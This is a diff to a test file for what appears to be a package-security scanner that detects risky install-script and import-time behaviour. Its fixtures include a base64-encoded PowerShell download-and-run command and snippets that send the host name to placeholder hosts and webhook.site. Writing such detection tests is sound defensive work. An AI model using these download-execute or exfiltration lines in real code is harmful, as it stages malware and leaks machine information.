@@ -9,7 +9,7 @@ import { test } from "node:test";
 import assert from "node:assert/strict";
 import { Buffer } from "node:buffer";
 import { installScriptRisk, importTimeRisk, importTimeSeverity, scanFile } from "../src/index.js";
-import { powershellRisk, stagerAt, reverseShellAt, sendsHostInfo, readsOwnSource, runsOwnSourceAt } from "../src/lib/hooks.js";
+import { powershellRisk, stagerAt, reverseShellAt, readsOwnSource, runsOwnSourceAt, importCode } from "../src/lib/hooks.js";
 
 const PS_RUN = Buffer.from('Invoke-WebRequest -Uri "https://x.invalid/a.exe" -OutFile "a.exe"; '
   + 'Invoke-Expression "a.exe"', "utf16le").toString("base64");
@@ -42,8 +42,16 @@ test("stagers, reverse shells, host information", () => {
     assert.ok(reverseShellAt(text) >= 0, text);
   }
   assert.equal(reverseShellAt("fd = os.open(log, os.O_WRONLY)\nos.dup2(fd, 1)\n"), -1);
-  assert.ok(sendsHostInfo("import socket, urllib.request\nurllib.request.urlopen('https://x.invalid/?h=' + socket.gethostname())\n"));
-  assert.ok(!sendsHostInfo("import socket\nprint(socket.gethostname())\n"));
+  // 0.1.8: the host name's flow into a request (0.1.7 read it anywhere in a file that used the network)
+  const HOST = "sends the machine's user or host name over the network";
+  for (const text of ["import socket, urllib.request\nurllib.request.urlopen('https://x.invalid/?h=' + socket.gethostname())\n",
+    "const os = require('os');\nfetch('https://x.invalid/', {method: 'POST', body: os.hostname()});\n"]) {
+    assert.ok(installScriptRisk(text).includes(HOST), text);
+  }
+  for (const text of ["import socket\nprint(socket.gethostname())\n", "print('run whoami to check')\nrequests.get(u)\n",
+    "import socket, requests\nh = socket.gethostname()\nlog(h)\nrequests.get('https://x.invalid/v')\n"]) {
+    assert.ok(!installScriptRisk(text).includes(HOST), text);
+  }
 });
 
 test("import-time grading", () => {
@@ -84,11 +92,15 @@ test("import time: prose is read out, PowerShell must be handed to an exec call"
   assert.deepEqual(importTimeRisk(runDoc, "py")[0], ["runs code it receives over the network",
     "runs code it reads back from its own file or a data file shipped with it"]);
   const beacon = 'requests.post("https://webhook.site/0", data=socket.gethostname())';
+  // an argument, a continued line, joined to the string before it, an f-string, something after it: code
+  // (a string's text is no flow, 0.1.8)
   for (const text of [`x = (\n    """${beacon}"""\n)\n`, `x = \\\n"""${beacon}"""\n`, `x = f(\n    'a'\n    """${beacon}"""\n)\n`,
     `f"""${beacon}"""\n`, `"""${beacon}""".strip()\n`]) {
-    assert.ok(importTimeRisk(text, "py")[0].length, text);
+    assert.equal(importCode(text, "py"), text, text);
   }
-  assert.deepEqual(importTimeRisk(`x = 1\n"""\n${beacon}\n"""\n`, "py"), [[], null]);
+  const standalone = `x = 1\n"""\n${beacon}\n"""\n`;
+  assert.notEqual(importCode(standalone, "py"), standalone);
+  assert.deepEqual(importTimeRisk(standalone, "py"), [[], null]);
 });
 
 test("code read back from the file itself", () => {
